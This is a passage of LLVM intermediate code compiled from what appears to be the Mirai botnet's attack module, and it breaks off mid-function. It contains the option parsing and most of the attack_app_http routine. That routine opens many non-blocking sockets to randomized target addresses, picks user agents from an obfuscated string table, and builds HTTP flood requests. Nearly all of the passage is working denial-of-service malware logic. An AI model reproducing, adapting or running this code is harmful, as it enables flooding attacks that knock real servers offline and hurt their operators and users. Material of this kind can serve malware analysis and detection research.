
._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #7
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #7
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #7
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 24, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %1077, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17) #7
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %1077, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16) #7
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %1077, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15) #7
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %1077, label %.preheader597

.preheader597:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15) #7
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph637.preheader, label %._crit_edge638

.lr.ph637.preheader:                              ; preds = %.preheader597
  br label %.lr.ph637

.lr.ph637:                                        ; preds = %.lr.ph637.preheader, %42
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = load i8, i8* %37, align 1
  %.off586 = add i8 %38, -97
  %39 = icmp ult i8 %.off586, 26
  br i1 %39, label %40, label %42

; <label>:40:                                     ; preds = %.lr.ph637
  %41 = add i8 %38, -32
  store i8 %41, i8* %37, align 1
  br label %42

; <label>:42:                                     ; preds = %.lr.ph637, %40
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  %45 = tail call i32 @util_strlen(i8* nonnull %15) #7
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %.lr.ph637, label %._crit_edge638.loopexit

._crit_edge638.loopexit:                          ; preds = %42
  br label %._crit_edge638

._crit_edge638:                                   ; preds = %._crit_edge638.loopexit, %.preheader597
  %47 = icmp slt i32 %18, 256
  %. = select i1 %47, i32 %18, i32 256
  tail call void @table_unlock_val(i8 zeroext 52) #7
  tail call void @table_unlock_val(i8 zeroext 53) #7
  tail call void @table_unlock_val(i8 zeroext 54) #7
  tail call void @table_unlock_val(i8 zeroext 55) #7
  tail call void @table_unlock_val(i8 zeroext 56) #7
  tail call void @table_unlock_val(i8 zeroext 57) #7
  tail call void @table_unlock_val(i8 zeroext 58) #7
  tail call void @table_unlock_val(i8 zeroext 59) #7
  tail call void @table_unlock_val(i8 zeroext 60) #7
  tail call void @table_unlock_val(i8 zeroext 61) #7
  tail call void @table_unlock_val(i8 zeroext 62) #7
  %48 = sext i32 %. to i64
  %49 = tail call noalias i8* @calloc(i64 %48, i64 3140) #7
  %50 = bitcast i8* %49 to %struct.attack_http_state*
  %51 = icmp sgt i32 %18, 0
  br i1 %51, label %.lr.ph636, label %.preheader595

.lr.ph636:                                        ; preds = %._crit_edge638
  %52 = zext i8 %0 to i32
  %53 = sext i32 %. to i64
  br label %71

.preheader595.loopexit:                           ; preds = %130
  br label %.preheader595

.preheader595:                                    ; preds = %.preheader595.loopexit, %._crit_edge638
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %56 = icmp sgt i32 %18, 0
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i64 0, i32 1
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i64 0, i32 0
  %59 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  %60 = bitcast i32* %12 to i8*
  %61 = bitcast %struct.sockaddr_in* %10 to i8*
  %62 = bitcast i32* %5 to i8*
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %66 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %67 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %68 = icmp ne i8* %14, null
  %69 = sext i32 %. to i64
  %70 = sext i32 %. to i64
  %.not = icmp slt i32 %18, 1
  br label %.backedge596

; <label>:71:                                     ; preds = %.lr.ph636, %130
  %indvars.iv661 = phi i64 [ 0, %.lr.ph636 ], [ %indvars.iv.next662, %130 ]
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 1
  store i8 0, i8* %72, align 4
  %73 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 0
  store i32 -1, i32* %73, align 4
  %74 = trunc i64 %indvars.iv661 to i32
  %75 = srem i32 %74, %52
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %76, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 4
  store i32 %78, i32* %79, align 4
  %80 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 0
  %81 = tail call i32 @util_strcpy(i8* %80, i8* %17) #7
  %82 = load i8, i8* %80, align 4
  %83 = icmp eq i8 %82, 47
  br i1 %83, label %88, label %84

; <label>:84:                                     ; preds = %71
  %85 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 1
  %86 = tail call i32 @util_strlen(i8* %80) #7
  %87 = sext i32 %86 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %85, i8* %80, i64 %87, i32 1, i1 false)
  store i8 47, i8* %80, align 4
  br label %88

; <label>:88:                                     ; preds = %71, %84
  %89 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 10, i64 0
  %90 = tail call i32 @util_strcpy(i8* %89, i8* %15) #7
  %91 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 9, i64 0
  %92 = tail call i32 @util_strcpy(i8* %91, i8* %15) #7
  %93 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 7, i64 0
  %94 = tail call i32 @util_strcpy(i8* %93, i8* %16) #7
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %76, i32 2
  %96 = load i8, i8* %95, align 4
  %97 = icmp ult i8 %96, 32
  br i1 %97, label %98, label %107

; <label>:98:                                     ; preds = %88
  %99 = load i32, i32* %77, align 4
  %100 = tail call i32 @ntohl(i32 %99) #8
  %101 = tail call i32 @rand_next() #7
  %102 = load i8, i8* %95, align 4
  %103 = zext i8 %102 to i32
  %104 = lshr i32 %101, %103
  %105 = add i32 %104, %100
  %106 = tail call i32 @htonl(i32 %105) #8
  store i32 %106, i32* %79, align 4
  br label %107

; <label>:107:                                    ; preds = %98, %88
  %108 = tail call i32 @rand_next() #7
  %109 = urem i32 %108, 5
  %trunc = trunc i32 %109 to i3
  switch i3 %trunc, label %130 [
    i3 0, label %110
    i3 1, label %114
    i3 2, label %118
    i3 3, label %122
    i3 -4, label %126
  ]

; <label>:110:                                    ; preds = %107
  tail call void @table_unlock_val(i8 zeroext 63) #7
  %111 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %112 = tail call i8* @table_retrieve_val(i32 63, i32* null) #7
  %113 = tail call i32 @util_strcpy(i8* %111, i8* %112) #7
  tail call void @table_lock_val(i8 zeroext 63) #7
  br label %130

; <label>:114:                                    ; preds = %107
  tail call void @table_unlock_val(i8 zeroext 64) #7
  %115 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %116 = tail call i8* @table_retrieve_val(i32 64, i32* null) #7
  %117 = tail call i32 @util_strcpy(i8* %115, i8* %116) #7
  tail call void @table_lock_val(i8 zeroext 64) #7
  br label %130

; <label>:118:                                    ; preds = %107
  tail call void @table_unlock_val(i8 zeroext 65) #7
  %119 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %120 = tail call i8* @table_retrieve_val(i32 65, i32* null) #7
  %121 = tail call i32 @util_strcpy(i8* %119, i8* %120) #7
  tail call void @table_lock_val(i8 zeroext 65) #7
  br label %130

; <label>:122:                                    ; preds = %107
  tail call void @table_unlock_val(i8 zeroext 66) #7
  %123 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %124 = tail call i8* @table_retrieve_val(i32 66, i32* null) #7
  %125 = tail call i32 @util_strcpy(i8* %123, i8* %124) #7
  tail call void @table_lock_val(i8 zeroext 66) #7
  br label %130

; <label>:126:                                    ; preds = %107
  tail call void @table_unlock_val(i8 zeroext 67) #7
  %127 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %128 = tail call i8* @table_retrieve_val(i32 67, i32* null) #7
  %129 = tail call i32 @util_strcpy(i8* %127, i8* %128) #7
  tail call void @table_lock_val(i8 zeroext 67) #7
  br label %130

; <label>:130:                                    ; preds = %126, %122, %118, %114, %110, %107
  %131 = tail call i32 @util_strcpy(i8* %80, i8* %17) #7
  %indvars.iv.next662 = add nuw nsw i64 %indvars.iv661, 1
  %132 = icmp slt i64 %indvars.iv.next662, %53
  br i1 %132, label %71, label %.preheader595.loopexit

.backedge596.loopexit:                            ; preds = %.loopexit591
  br label %.backedge596.backedge

.backedge596:                                     ; preds = %.backedge596.backedge, %.preheader595
  %133 = call i64 @time(i64* null) #7
  %134 = trunc i64 %133 to i32
  %135 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #7, !srcloc !1
  %136 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %55) #7, !srcloc !2
  br i1 %56, label %.lr.ph615.preheader, label %.backedge596.backedge

.lr.ph615.preheader:                              ; preds = %.backedge596
  br label %.lr.ph615

.lr.ph615:                                        ; preds = %.lr.ph615.preheader, %411
  %indvars.iv = phi i64 [ %indvars.iv.next, %411 ], [ 0, %.lr.ph615.preheader ]
  %.0530612 = phi i32 [ %.1531, %411 ], [ 0, %.lr.ph615.preheader ]
  %137 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv
  %138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 1
  %139 = load i8, i8* %138, align 4
  %140 = icmp eq i8 %139, 1
  br i1 %140, label %141, label %145

; <label>:141:                                    ; preds = %.lr.ph615
  %142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 12
  %143 = load i32, i32* %142, align 4
  %144 = icmp ne i32 %143, 0
  %.sink = select i1 %144, i8 4, i8 0
  store i8 %.sink, i8* %138, align 4
  br label %145

; <label>:145:                                    ; preds = %141, %.lr.ph615
  %146 = phi i8 [ %.sink, %141 ], [ %139, %.lr.ph615 ]
  switch i8 %146, label %407 [
    i8 0, label %147
    i8 2, label %180
    i8 4, label %203
    i8 6, label %365
    i8 7, label %379
    i8 10, label %393
  ]

; <label>:147:                                    ; preds = %145
  call void @llvm.memset.p0i8.i64(i8* nonnull %61, i8 0, i64 16, i32 4, i1 false)
  %148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %149 = load i32, i32* %148, align 4
  %150 = icmp eq i32 %149, -1
  br i1 %150, label %153, label %151

; <label>:151:                                    ; preds = %147
  %152 = call i32 @close(i32 %149) #7
  br label %153

; <label>:153:                                    ; preds = %147, %151
  %154 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %154, i32* %148, align 4
  %155 = icmp eq i32 %154, -1
  br i1 %155, label %411, label %156

; <label>:156:                                    ; preds = %153
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %154, i32 3, i32 0) #7
  %158 = or i32 %157, 2048
  %159 = call i32 (i32, i32, ...) @fcntl(i32 %154, i32 4, i32 %158) #7
  store i32 65535, i32* %5, align 4
  %160 = load i32, i32* %148, align 4
  %161 = call i32 @setsockopt(i32 %160, i32 0, i32 8, i8* nonnull %62, i32 4) #7
  store i16 2, i16* %63, align 4
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 4
  %163 = load i32, i32* %162, align 4
  store i32 %163, i32* %64, align 4
  %164 = call zeroext i16 @htons(i16 zeroext %20) #8
  store i16 %164, i16* %65, align 2
  %165 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  store i32 %134, i32* %165, align 4
  store i8 2, i8* %138, align 4
  %166 = load i32, i32* %148, align 4
  %167 = call i32 @connect(i32 %166, %struct.sockaddr* nonnull %66, i32 16) #7
  %168 = load i32, i32* %148, align 4
  %169 = srem i32 %168, 64
  %170 = zext i32 %169 to i64
  %171 = shl i64 1, %170
  %172 = sdiv i32 %168, 64
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %173
  %175 = load i64, i64* %174, align 8
  %176 = or i64 %171, %175
  store i64 %176, i64* %174, align 8
  %177 = load i32, i32* %148, align 4
  %178 = icmp sgt i32 %177, %.0530612
  %179 = add nsw i32 %177, 1
  %..0530 = select i1 %178, i32 %179, i32 %.0530612
  br label %411

; <label>:180:                                    ; preds = %145
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  %182 = load i32, i32* %181, align 4
  %183 = sub i32 %134, %182
  %184 = icmp ugt i32 %183, 30
  br i1 %184, label %185, label %189

; <label>:185:                                    ; preds = %180
  store i8 0, i8* %138, align 4
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %187 = load i32, i32* %186, align 4
  %188 = call i32 @close(i32 %187) #7
  store i32 -1, i32* %186, align 4
  br label %411

; <label>:189:                                    ; preds = %180
  %190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %137, i64 0, i32 0
  %191 = load i32, i32* %190, align 4
  %192 = srem i32 %191, 64
  %193 = zext i32 %192 to i64
  %194 = shl i64 1, %193
  %195 = sdiv i32 %191, 64
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %196
  %198 = load i64, i64* %197, align 8
  %199 = or i64 %194, %198
  store i64 %199, i64* %197, align 8
  %200 = load i32, i32* %190, align 4
  %201 = icmp sgt i32 %200, %.0530612
  %202 = add nsw i32 %200, 1
  %..0530550 = select i1 %201, i32 %202, i32 %.0530612
  br label %411

; <label>:203:                                    ; preds = %145
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 14
  store i32 -1, i32* %204, align 4
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 11
  store i32 0, i32* %205, align 4
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %206, i32 1024) #7
  %207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 17
  store i32 0, i32* %207, align 4
  call void @util_zero(i8* nonnull %67, i32 10240) #7
  %208 = call i32 @util_strlen(i8* nonnull %67) #7
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 9, i64 0
  %212 = call i32 @util_strcpy(i8* %210, i8* %211) #7
  %213 = call i32 @util_strlen(i8* nonnull %67) #7
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %214
  %216 = call i32 @util_strcpy(i8* %215, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #7
  %217 = call i32 @util_strlen(i8* nonnull %67) #7
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %218
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 6, i64 0
  %221 = call i32 @util_strcpy(i8* %219, i8* %220) #7
  %222 = call i32 @util_strlen(i8* nonnull %67) #7
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %223
  %225 = call i32 @util_strcpy(i8* %224, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0)) #7
  %226 = call i32 @util_strlen(i8* nonnull %67) #7
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %227
  %229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 5, i64 0
  %230 = call i32 @util_strcpy(i8* %228, i8* %229) #7
  %231 = call i32 @util_strlen(i8* nonnull %67) #7
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %232
  %234 = call i32 @util_strcpy(i8* %233, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0)) #7
  %235 = call i32 @util_strlen(i8* nonnull %67) #7
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %236
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 7, i64 0
  %239 = call i32 @util_strcpy(i8* %237, i8* %238) #7
  %240 = call i32 @util_strlen(i8* nonnull %67) #7
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %241
  %243 = call i32 @util_strcpy(i8* %242, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  call void @table_unlock_val(i8 zeroext 48) #7
  %244 = call i32 @util_strlen(i8* nonnull %67) #7
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %245
  %247 = call i8* @table_retrieve_val(i32 48, i32* null) #7
  %248 = call i32 @util_strcpy(i8* %246, i8* %247) #7
  call void @table_lock_val(i8 zeroext 48) #7
  %249 = call i32 @util_strlen(i8* nonnull %67) #7
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %250
  %252 = call i32 @util_strcpy(i8* %251, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  call void @table_unlock_val(i8 zeroext 49) #7
  %253 = call i32 @util_strlen(i8* nonnull %67) #7
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %254
  %256 = call i8* @table_retrieve_val(i32 49, i32* null) #7
  %257 = call i32 @util_strcpy(i8* %255, i8* %256) #7
  call void @table_lock_val(i8 zeroext 49) #7
  %258 = call i32 @util_strlen(i8* nonnull %67) #7
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %259
  %261 = call i32 @util_strcpy(i8* %260, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  call void @table_unlock_val(i8 zeroext 50) #7
  %262 = call i32 @util_strlen(i8* nonnull %67) #7
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %263
  %265 = call i8* @table_retrieve_val(i32 50, i32* null) #7
  %266 = call i32 @util_strcpy(i8* %264, i8* %265) #7
  call void @table_lock_val(i8 zeroext 50) #7
  %267 = call i32 @util_strlen(i8* nonnull %67) #7
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %268
  %270 = call i32 @util_strcpy(i8* %269, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br i1 %68, label %271, label %299

; <label>:271:                                    ; preds = %203
  call void @table_unlock_val(i8 zeroext 51) #7
  %272 = call i32 @util_strlen(i8* nonnull %67) #7
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %273
  %275 = call i8* @table_retrieve_val(i32 51, i32* null) #7
  %276 = call i32 @util_strcpy(i8* %274, i8* %275) #7
  call void @table_lock_val(i8 zeroext 51) #7
  %277 = call i32 @util_strlen(i8* nonnull %67) #7
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %278
  %280 = call i32 @util_strcpy(i8* %279, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  %281 = call i32 @util_strlen(i8* nonnull %67) #7
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %282
  %284 = call i8* @table_retrieve_val(i32 56, i32* null) #7
  %285 = call i32 @util_strcpy(i8* %283, i8* %284) #7
  %286 = call i32 @util_strlen(i8* nonnull %67) #7
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %287
  %289 = call i32 @util_strcpy(i8* %288, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0)) #7
  %290 = call i32 @util_strlen(i8* nonnull %14) #7
  %291 = call i32 @util_strlen(i8* nonnull %67) #7
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %292
  %294 = call i8* @util_itoa(i32 %290, i32 10, i8* %293) #7
  %295 = call i32 @util_strlen(i8* nonnull %67) #7
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %296
  %298 = call i32 @util_strcpy(i8* %297, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0)) #7
  br label %299

; <label>:299:                                    ; preds = %271, %203
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 15
  %301 = load i32, i32* %300, align 4
  %302 = icmp sgt i32 %301, 0
  br i1 %302, label %303, label %330

; <label>:303:                                    ; preds = %299
  %304 = call i32 @util_strlen(i8* nonnull %67) #7
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %305
  %307 = call i32 @util_strcpy(i8* %306, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0)) #7
  store i32 0, i32* %5, align 4
  %308 = load i32, i32* %300, align 4
  %309 = icmp sgt i32 %308, 0
  %310 = call i32 @util_strlen(i8* nonnull %67) #7
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %311
  br i1 %309, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %303
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %313 = phi i8* [ %328, %.lr.ph ], [ %312, %.lr.ph.preheader ]
  %314 = load i32, i32* %5, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 16, i64 %315, i64 0
  %317 = call i32 @util_strcpy(i8* %313, i8* %316) #7
  %318 = call i32 @util_strlen(i8* nonnull %67) #7
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %319
  %321 = call i32 @util_strcpy(i8* %320, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0)) #7
  %322 = load i32, i32* %5, align 4
  %323 = add nsw i32 %322, 1
  store i32 %323, i32* %5, align 4
  %324 = load i32, i32* %300, align 4
  %325 = icmp slt i32 %323, %324
